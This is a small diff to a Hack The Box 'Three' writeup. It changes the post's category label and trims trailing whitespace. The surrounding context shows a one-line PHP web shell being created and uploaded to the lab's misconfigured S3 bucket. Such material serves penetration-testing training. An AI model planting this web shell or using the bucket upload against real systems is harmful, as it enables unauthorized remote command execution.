@@ -1,7 +1,7 @@
 export const frontmatter = {
   title: "Hack The Box Three Writeup",
   slug: "hack-the-box-three-machine-writeup",
-  category: "HTB Starting Point",
+  category: "HTB Machine",
   description:
     "Complete walkthrough of the Hack The Box Starting Point machine Three, covering virtual host enumeration, S3-compatible object storage discovery, misconfigured bucket exploitation, arbitrary PHP file upload, remote command execution, and flag retrieval.",
   date: "2026-06-16",
@@ -107,7 +107,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 Upload the generated PHP web shell to the S3 bucket with (`aws s3 cp shell.php s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb`):
 ```
-upload: ./shell.php to s3://thetoppers.htb/shell.php             
+upload: ./shell.php to s3://thetoppers.htb/shell.php
 ```
 
 Verify the upload with (`aws s3 ls s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb`):
